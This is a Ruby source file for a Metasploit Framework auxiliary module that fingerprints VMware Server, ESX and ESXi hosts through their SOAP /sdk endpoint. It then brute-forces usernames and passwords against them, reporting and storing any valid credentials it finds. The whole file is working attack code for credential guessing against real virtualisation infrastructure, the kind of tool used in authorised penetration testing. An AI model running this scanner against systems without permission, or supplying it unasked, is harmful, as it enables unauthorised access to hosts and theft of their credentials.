##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'rex/proto/ntlm/message'


class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::VIMSoap
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'VMWare Web Login Scanner',
			'Version'        => '$Revision$',
			'Description'    => 'This module attempts to authenticate to the VMWare HTTP service 
							 for VmWare Server, ESX, and ESXI',
			'Author'         => ['TheLightCosine <thelightcosine[at]metasploit.com>'],
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(443)
			], self.class)
	end

	# Mostly taken from the Apache Tomcat service validator
	def check(ip)
		soap_data = 
			%Q|<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
			<env:Body>
			<RetrieveServiceContent xmlns="urn:vim25">
				<_this type="ServiceInstance">ServiceInstance</_this>
			</RetrieveServiceContent>
			</env:Body>
			</env:Envelope>|
		datastore['URI'] ||= "/sdk"
		user = Rex::Text.rand_text_alpha(8)
		pass = Rex::Text.rand_text_alpha(8)
		begin
			res = send_request_cgi({
				'uri'     => datastore['URI'],
				'method'  => 'POST',
				'agent'   => 'VMware VI Client',
				'data' =>  soap_data
			}, 25)
			if res
				return false unless res.body.include?('<vendor>VMware, Inc.</vendor>')
				os_match = res.body.match(/<name>([\w\s]+)<\/name>/)
				ver_match = res.body.match(/<version>([\w\s\.]+)<\/version>/)
				build_match = res.body.match(/<build>([\w\s\.\-]+)<\/build>/)
				full_match = res.body.match(/<name>([\w\s\.\-]+)<\/name>/)
				if os_match and ver_match and build_match
					report_host( :host => ip, :os_name => os_match[1], :os_flavor => ver_match[1], :os_sp => "Build #{build_match[1]}" )
				end
				if full_match
					report_service(:host => rhost, :port => rport, :proto => 'tcp', :sname => 'https', :info => full_match[1])
					return true
				else
					vprint_error("http://#{ip}:#{rport} - Could not identify as VMWare")
					return false
				end
			else
				vprint_error("http://#{ip}:#{rport} - No response")
			end
		rescue ::Rex::ConnectionError => e
			vprint_error("http://#{ip}:#{rport}#{datastore['URI']} - #{e}")
			return false
		rescue
			vprint_error("Skipping #{ip} due to error - #{e}")
			return false
		end
	end



	def run_host(ip)
		return unless check(ip)
		each_user_pass { |user, pass|
			result = vim_do_login(user, pass)
			case result
			when :success
				print_good "#{ip}:#{rport} - Successful Login! (#{user}:#{pass})"
				report_auth_info(
					:host   => rhost,
					:port   => rport,
					:user   => user,
					:pass   => pass,
					:source_type => "user_supplied",
					:active => true
				)
				return if datastore['STOP_ON_SUCCESS']
			when :fail
				print_error "#{ip}:#{rport} - Login Failure (#{user}:#{pass})"
			end
		}
	end




end

